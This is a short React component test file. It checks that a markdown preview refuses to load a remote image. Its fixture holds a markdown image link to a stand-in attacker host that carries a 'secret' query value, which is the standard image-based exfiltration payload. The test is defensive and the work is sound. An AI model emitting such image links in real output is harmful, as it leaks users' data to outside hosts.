import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import { MarkdownPreview } from "./shared";

describe("MarkdownPreview", () => {
  afterEach(cleanup);

  it("never loads a remote image from a streaming preview", async () => {
    const { container } = render(
      <MarkdownPreview>
        {"Notes ![leak](https://evil.example/?q=secret) end"}
      </MarkdownPreview>,
    );

    expect(await screen.findByText(/leak/)).toBeTruthy();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });
});
